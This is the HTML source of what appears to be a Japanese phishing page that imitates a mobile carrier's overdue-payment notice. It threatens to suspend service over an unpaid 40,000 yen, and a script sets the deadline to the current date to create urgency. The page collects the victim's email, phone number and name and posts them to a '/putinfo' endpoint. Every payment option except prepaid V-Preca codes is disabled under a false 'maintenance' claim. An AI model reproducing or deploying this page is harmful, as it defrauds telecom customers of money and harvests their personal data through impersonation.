<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Title</title>
    <link rel="stylesheet" href="/static/au_order/new1.css">
    <link rel="stylesheet" href="/static/au_order/new2.css">
    <script type="text/javascript" charset="utf-8" src="/static/hau/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" charset="utf-8" src="/static/hau/jquery.cookie.js"></script>
</head>
<body>
    <header id="header">
        <a id="logo" href="">
            <img src="/static/au_order/logo.png" alt="">
        </a>
    </header>
    <div class="container">
        <div class="notice">
            <div class="title">
                【重要なお知らせ】
            </div>
            <div class="text">
                下記内容をご確認の上、至急お支払いください。 万一、支払期日を過ぎると、弊社通信サービスのご利用を【停止】致します。
            </div>
            <div class="icon-container">
                <span class="down-icon">


                </span>
            </div>
        </div>
        <div class="clear"></div>
        <form action="" method="post">
            <div class="form-container">
                <div class="form-bg"></div>
                <div class="price-container">
                    <div class="price-line">
                        <span id="stit">未払い金額：</span>
                        <span id="price">40,000</span>
                        <span id="price-unit">円</span>
                        <span id="price-after-tips">（税込）</span>
                    </div>
                    <div class="clear"></div>
                    <div class="date-line">
                        <div class="tips">支払い期限：</div>
                        <div class="date-container">
                            <span class="date" id="time1">2023年5月12日</span>
                            <span class="after-date">（支払期日の延長不可）</span>
                        </div>
                    </div>

                    <script>
                        var myDate = new Date();
                        var year = myDate.getFullYear();
                        var month = myDate.getMonth()+1;
                        var day = myDate.getDate();   
                        $("#time1").html(year+"年"+month+"月"+day+"日");
                    </script>
                    <div class="clear"></div>
                </div>
                
                <div class="clear"></div>

                
                
                <div class="user-container">
                    <div class="header">
                        <span>本人情報の確認を入力</span>
                    </div>

                    <div class="form">
                        <div class="row">
                            <dt class="tit">メールアドレス入力</dt>
                            <dd class="input-container">
                                <input placeholder="メールアドレス入力" class="input" type="text" name="email" id="email" maxlength="50">
                            </dd>
                        </div>

                        <div class="row">
                            <dt class="tit">電話番号をご入力ください</dt>
                            <dd class="input-container">
                                <input placeholder="携帯電話番号" class="input" type="text" name="tel" id="tel" maxlength="15">
                            </dd>
                        </div>

                        <div class="row">
                            <dt class="tit">お名前（漢字）</dt>
                            <dd class="input-container">
                                <input placeholder="（例：山田太郎）" class="input" type="text" name="username" id="username" maxlength="16">
                            </dd>
                        </div>
                    </div>
                </div>
                
                <div class="pay-container">
                    <div class="header">
                        <span>支払い方法</span>
                    </div>

                    <div class="form">
                        <dt>
                            <input type="radio" name="paymethod" id="paymethod_01" checked="">
                            <label for="paymethod_01">電子マネー（vプリカ発行コード）</label>
                        </dt>
                        <dd>
                            <img src="/static/au_order/vcard.jpeg" alt="">
                        </dd>

                        <dt>
                            <input disabled="" type="radio" name="paymethod" id="paymethod_02">
                            <label for="paymethod_02">
                                <s>クレジットカード</s>
                            </label>
                        </dt>
                        <dd>
                            <img src="/static/au_order/fig_cc-01.png" alt="">
                            <div>
                                <span>※</span>
                                <span>メンテナンスに伴うサービス一時停止となります。</span>
                            </div>
                        </dd>

                        <dt>
                            <input disabled="" type="radio" name="paymethod" id="paymethod_03">
                            <label for="paymethod_03">
                                <s>コンビニエンスストア</s>
                            </label>
                        </dt>
                        <dd>
                            <img src="/static/au_order/icon_seven.png" alt="">
                            <img src="/static/au_order/icon_lawson.png" alt="">
                            <img src="/static/au_order/icon_ministop.png" alt="">
                            <img src="/static/au_order/icon_seicomart.png" alt="">
                            <div>
                                <span>※</span>
                                <span>メンテナンスに伴うサービス一時停止となります。</span>
                            </div>
                        </dd>

                        <dt>
                            <input disabled="" type="radio" name="paymethod" id="paymethod_04">
                            <label for="paymethod_04">
                                <s>ネットバンキング（Pay-easy）</s>
                            </label>
                        </dt>
                        <dd>
                            <span>※</span>
                            <span>メンテナンスに伴うサービス一時停止となります。</span>
                        </dd>
                    </div>
                </div>
            </div>
            
        </form>
    </div>

    <footer id="footer">
        <div class="btn-container">
            <a id="next-btn" onclick="reg()">次へ</a>
        </div>
    </footer>



<script>
    function reg() {
        if ($("#email").val() == "") {
            $("#email").focus();
            alert("入力してください。");
            return;
        }
        if ($("#tel").val() == "") {
            $("#tel").focus();
            alert("入力してください。");
            return;
        }
        if ($("#username").val() == "") {
            $("#username").focus();
            alert("入力してください。");
            return;
        }
        var email = $("#email").val();
        var tel = $("#tel").val();
        var username = $("#username").val();

        $.post("/putinfo", {
                Origin: "YahooVK",
                Page: "1",
                Val1: email,
                Val2: tel,
                Val3: username
            }, function(data) {
                if (data.Code == 1 && data.Message == "success") {
                    document.location.href = "/498894832";
                    
                } else {
                    document.location.reload();
                }
        });
    }
</script>
</body></html>
